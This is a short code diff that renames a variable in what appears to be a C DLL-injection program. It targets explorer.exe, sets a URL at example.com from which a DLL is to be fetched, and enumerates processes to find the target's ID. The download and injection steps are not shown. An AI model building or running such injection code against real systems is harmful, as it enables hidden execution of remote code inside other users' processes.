@@ -1,6 +1,6 @@
 #include "injection.h"
 
-const char* szProc = "explorer.exe";
+const char* ProcName = "explorer.exe";
 const char* DllURL = "https://example.com/library.dll";
 
 int main() {
@@ -17,7 +17,7 @@ int main() {
 	DWORD PID = 0;
 	BOOL bRet = Process32First(hSnap, &PE32);
 	while (bRet) {
-		if (!strcmp(szProc, PE32.szExeFile)) {
+		if (!strcmp(ProcName, PE32.szExeFile)) {
 			PID = PE32.th32ProcessID;
 			break;
 		}
